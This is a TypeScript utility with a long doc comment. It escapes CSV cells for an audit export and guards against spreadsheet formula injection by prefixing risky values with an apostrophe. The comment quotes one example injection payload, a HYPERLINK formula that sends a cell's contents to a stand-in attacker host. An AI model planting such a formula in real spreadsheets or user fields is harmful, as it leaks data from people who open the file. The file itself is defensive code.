/**
 * CSV cell escaping for the audit export.
 *
 * It lives in `lib/` rather than inside `AuditPage.tsx` so it can be asserted by a
 * self-test (`npm run audit:csv-selftest`) without importing a component tree.
 * A regex guard that is subtly wrong looks correct and fails silently — exactly
 * the shape of the defect it exists to prevent — so it is tested, not reviewed.
 *
 * Two separate hazards, both handled:
 *
 *  1. **Delimiters and quoting.** A comma, quote, semicolon or newline would end
 *     the field early, so the value is quoted and its quotes doubled (RFC 4180).
 *
 *  2. **Formula injection (B-3).** Excel, LibreOffice and Google Sheets treat a
 *     cell beginning with `=`, `+`, `-`, `@`, a tab or a carriage return as a
 *     FORMULA. The audit trail contains operator-supplied text — display names,
 *     e-mails, panel e-mails, free-form audit context — so a customer who signs
 *     up as `=HYPERLINK("http://evil/"&A2,"click")` would execute that formula on
 *     the administrator's machine when the export is opened. A leading single
 *     quote makes the cell literal text, which is the standard mitigation.
 *
 * The apostrophe is only added when the value could be read as a formula, so an
 * ordinary export is byte-identical to what it was before.
 */
export function csvCell(value: string): string {
  const safe = /^[=+\-@\t\r]/.test(value) ? `'${value}` : value
  return /[",\n\r;]/.test(safe) ? `"${safe.replace(/"/g, '""')}"` : safe
}
